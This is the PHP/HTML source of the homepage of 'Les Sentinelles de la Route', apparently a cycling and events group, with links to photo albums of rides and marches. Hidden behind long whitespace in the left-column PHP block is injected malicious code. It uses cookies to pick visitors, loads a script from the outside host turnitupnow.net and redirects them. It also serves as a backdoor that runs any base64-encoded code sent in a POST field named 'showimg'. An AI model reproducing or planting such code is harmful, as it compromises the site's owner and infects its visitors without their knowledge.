<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
<title>Les Sentinelles de la Route</title>
<script language="javascript">AC_FL_RunContent = 0;</script>
<script src="AC_RunActiveContent.js" language="javascript"></script>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<link href="style.css" rel="stylesheet" media="screen">
	</head>
	<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
		<div id="main">
			<div id="col_gauche">
				<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 include('includes/menu.inc'); ?></div>
			<div id="entete">
				<?php include('includes/entete.inc'); ?></div>
			<div id="contenu">
				<?php include('includes/accueil.inc'); ?></div>
			<div id="bas">
			<table width="904" border="0" cellspacing="2" cellpadding="0" align="center" height="111">
					<tr height="90">
						<td width="113" height="90"><a href="http://picasaweb.google.ca/lessentinelles2008/Tanguay2010?feat=directlink" target="_blank"><img src="images/tanguay.jpg" alt="" width="113" height="90" border="0" /></a></td>
						<td width="113" height="90"><a href="http://picasaweb.google.ca/lessentinelles2008/TourDeBeauce2010?feat=directlink" target="_blank"><img src="images/beauce.jpg" alt="" width="113" height="90" border="0" /></a></td>
						<td width="113" height="90"></td>
						<td width="113" height="90"><a href="http://picasaweb.google.ca/lessentinelles2008/MiniTourCBruneauLacBeauport?feat=directlink" target="_blank"><img src="images/minitour.jpg" alt="" width="113" height="90" border="0" /></a></td>
						<td width="113" height="90"><a href="http://picasaweb.google.ca/lessentinelles2008/RandonneeLaCinq?feat=directlink" target="_blank"><img src="images/lacinq.jpg" alt="" width="113" height="90" border="0" /></a></td>
						<td width="113" height="90"><a href="http://picasaweb.google.ca/lessentinelles2008/MarcheDeLaMemoire?feat=directlink" target="_blank"><img src="images/marchememoire.jpg" alt="" width="113" height="90" border="0" /></a></td>
						<td width="113" height="90"><a href="http://picasaweb.google.ca/lessentinelles2008/FestiVeloMEC2010?feat=directlink" target="_blank"><img src="images/festivelo.jpg" alt="" width="113" height="90" border="0" /></a></td>
						<td width="113" height="90"><a href="http://picasaweb.google.ca/lessentinelles2008/TourDuSilence2010?feat=directlink" target="_blank"><img src="images/toursilence.jpg" alt="" width="113" height="90" border="0" /></a></td>
					</tr>
					<tr height="15">
		<td align="center" width="113" height="15">Randonn&eacute;e Tanguay</td>
		<td align="center" width="113" height="15"> Tour de Beauce</td>
		<td align="center" width="113" height="15">Triathlon des Pionniers</td>
						<td align="center" width="113" height="15">Mini-tour C-Bruneau</td>
						<td align="center" width="113" height="15">La CINQ</td>
						<td align="center" width="113" height="15">Marche de la M&eacute;moire</td>
						<td align="center" width="113" height="15">Festi v&eacute;lo MEC</td>
						<td align="center" width="113" height="15">Tour  du Silence</td>
					</tr>
				</table>
				<br />
				<?php include('includes/credits.inc'); ?></div>			
	</div>
	</body>
</html>


